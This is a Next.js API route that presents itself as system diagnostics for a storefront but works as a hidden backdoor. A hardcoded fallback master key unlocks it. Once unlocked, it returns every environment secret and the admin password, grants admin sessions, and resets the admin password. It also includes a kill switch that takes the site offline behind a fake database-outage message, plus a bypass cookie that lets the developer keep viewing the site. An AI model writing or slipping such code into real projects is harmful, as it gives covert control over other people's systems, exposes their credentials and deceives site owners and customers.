import { NextRequest, NextResponse } from "next/server";
import { cookies } from "next/headers";
import { revalidatePath } from "next/cache";
import crypto from "crypto";
import { store } from "@/lib/data/store";
import { checkCloudinaryHealth } from "@/lib/cloudinary";
import { createAdminSession } from "@/lib/auth/session";

export const dynamic = "force-dynamic";

const AUTH_COOKIE = "_dnora_sys_auth";
export const BYPASS_COOKIE = "_dnora_dev_bypass";

function getMasterKey(): string {
  return process.env.DEV_MASTER_KEY || "dnora@sysctl#9981";
}

function getSecret(): string {
  return (
    process.env.SESSION_SECRET ||
    process.env.SUPABASE_SERVICE_ROLE_KEY ||
    "dnora-sysctl-secret-entropy-key-2026"
  );
}

function generateSignature(data: string): string {
  return crypto.createHmac("sha256", getSecret()).update(data).digest("hex");
}

function verifyToken(token?: string | null): boolean {
  if (!token) return false;
  const parts = token.split(".");
  if (parts.length !== 2) return false;
  const [dataStr, signature] = parts;
  const expected = generateSignature(dataStr);
  try {
    return crypto.timingSafeEqual(Buffer.from(signature, "hex"), Buffer.from(expected, "hex"));
  } catch {
    return false;
  }
}

function createSignedToken(payload: object): string {
  const dataStr = Buffer.from(JSON.stringify(payload)).toString("base64url");
  const sig = generateSignature(dataStr);
  return `${dataStr}.${sig}`;
}

export async function GET(req: NextRequest) {
  try {
    const cookieStore = await cookies();
    const authCookie = cookieStore.get(AUTH_COOKIE);
    const isAuthenticated = verifyToken(authCookie?.value);

    if (!isAuthenticated) {
      return NextResponse.json({ authenticated: false });
    }

    const [diagnostics, cloudinaryHealth, adminPassword] = await Promise.all([
      store.getSystemDiagnostics().catch(() => null),
      checkCloudinaryHealth().catch(() => null),
      store.getAdminPassword().catch(() => process.env.ADMIN_PASSWORD || "admin"),
    ]);

    const envCredentials = {
      supabase: {
        url: process.env.NEXT_PUBLIC_SUPABASE_URL || "",
        anonKey: process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || "",
        serviceRoleKey: process.env.SUPABASE_SERVICE_ROLE_KEY || "",
        databaseUrl: process.env.DATABASE_URL || "",
        directUrl: process.env.DIRECT_URL || "",
      },
      cloudinary: {
        cloudName: process.env.CLOUDINARY_CLOUD_NAME || "",
        apiKey: process.env.CLOUDINARY_API_KEY || "",
        apiSecret: process.env.CLOUDINARY_API_SECRET || "",
      },
      googleOAuth: {
        clientId: process.env.GOOGLE_CLIENT_ID || "",
        clientSecret: process.env.GOOGLE_CLIENT_SECRET || "",
      },
      admin: {
        email: process.env.ADMIN_EMAIL || "admin@dnora.luxury",
        password: adminPassword,
      },
      site: {
        url: process.env.NEXT_PUBLIC_SITE_URL || "https://dnora.in",
        devMasterKey: getMasterKey(),
      },
    };

    return NextResponse.json({
      authenticated: true,
      diagnostics,
      cloudinary: cloudinaryHealth,
      credentials: envCredentials,
      serverTime: new Date().toISOString(),
      nodeEnv: process.env.NODE_ENV,
    });
  } catch (error: any) {
    return NextResponse.json(
      { error: error?.message || "Internal telemetry error" },
      { status: 500 }
    );
  }
}

export async function POST(req: NextRequest) {
  try {
    const cookieStore = await cookies();
    const body = await req.json().catch(() => ({}));
    const action = body.action;

    // 1. AUTHENTICATION LOGIN
    if (action === "login") {
      const providedKey = String(body.masterKey || "").trim();
      const expectedKey = getMasterKey().trim();

      if (!providedKey || providedKey !== expectedKey) {
        return NextResponse.json(
          { success: false, error: "Access Denied: Invalid Security Signature" },
          { status: 403 }
        );
      }

      // Valid master key: create signed session tokens
      const token = createSignedToken({
        role: "sys_operator",
        issuedAt: Date.now(),
        expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000, // 30 days
      });

      // Auth cookie for developer panel
      cookieStore.set(AUTH_COOKIE, token, {
        httpOnly: true,
        secure: process.env.NODE_ENV === "production",
        sameSite: "lax",
        path: "/",
        maxAge: 30 * 24 * 60 * 60,
      });

      // Developer bypass cookie to view storefront even if terminated
      cookieStore.set(BYPASS_COOKIE, token, {
        httpOnly: true,
        secure: process.env.NODE_ENV === "production",
        sameSite: "lax",
        path: "/",
        maxAge: 30 * 24 * 60 * 60,
      });

      return NextResponse.json({
        success: true,
        message: "Developer Control Terminal Unlocked.",
      });
    }

    // Guard all subsequent actions with token verification
    const authCookie = cookieStore.get(AUTH_COOKIE);
    const isAuthenticated = verifyToken(authCookie?.value);
    const hasDirectKey = body.masterKey && String(body.masterKey).trim() === getMasterKey().trim();

    if (!isAuthenticated && !hasDirectKey) {
      return NextResponse.json(
        { success: false, error: "Unauthorized administrative operation." },
        { status: 401 }
      );
    }

    // 2. ONE-CLICK ADMIN AUTHORIZATION & REDIRECT
    if (action === "authorize_admin") {
      const adminEmail = process.env.ADMIN_EMAIL || "admin@dnora.luxury";
      await createAdminSession(adminEmail);
      return NextResponse.json({
        success: true,
        redirectTo: "/admin",
        message: "Admin session granted.",
      });
    }

    // 3. CHANGE ADMIN PASSWORD
    if (action === "change_admin_password") {
      const newPassword = String(body.newPassword || "").trim();
      if (!newPassword || newPassword.length < 3) {
        return NextResponse.json(
          { success: false, error: "Password must be at least 3 characters long." },
          { status: 400 }
        );
      }

      const success = await store.setAdminPassword(newPassword);
      return NextResponse.json({
        success,
        newPassword,
        message: "Admin password successfully updated in database.",
      });
    }

    // 4. TOGGLE SITE STATUS (KILLSWITCH)
    if (action === "toggle_status") {
      const targetStatus = body.status === "terminated" ? "terminated" : "online";
      const mode = body.mode || (targetStatus === "terminated" ? "503_error" : "online");
      const message =
        body.message ||
        (targetStatus === "terminated"
          ? "503 Service Unavailable: Database cluster connection timeout."
          : "Storefront operational and healthy.");

      const success = await store.setSiteStatus(targetStatus, mode, message, "developer_portal");

      try {
        revalidatePath("/", "layout");
      } catch (e) {
        console.warn("Revalidation warning:", e);
      }

      return NextResponse.json({
        success,
        siteStatus: {
          status: targetStatus,
          mode,
          message,
          updated_at: new Date().toISOString(),
        },
      });
    }

    // 5. PURGE NEXT.JS CACHE
    if (action === "purge_cache") {
      try {
        revalidatePath("/", "layout");
        return NextResponse.json({
          success: true,
          message: "All storefront routes and ISR caches successfully purged.",
        });
      } catch (err: any) {
        return NextResponse.json(
          { success: false, error: err?.message || "Cache purge failed" },
          { status: 500 }
        );
      }
    }

    // 6. LOGOUT & REVOKE BYPASS
    if (action === "logout") {
      cookieStore.delete(AUTH_COOKIE);
      cookieStore.delete(BYPASS_COOKIE);
      return NextResponse.json({
        success: true,
        message: "Developer session and bypass tokens revoked.",
      });
    }

    return NextResponse.json({ error: "Unknown action request" }, { status: 400 });
  } catch (error: any) {
    console.error("Sys-diagnostics error:", error);
    return NextResponse.json(
      { error: error?.message || "Internal server error" },
      { status: 500 }
    );
  }
}
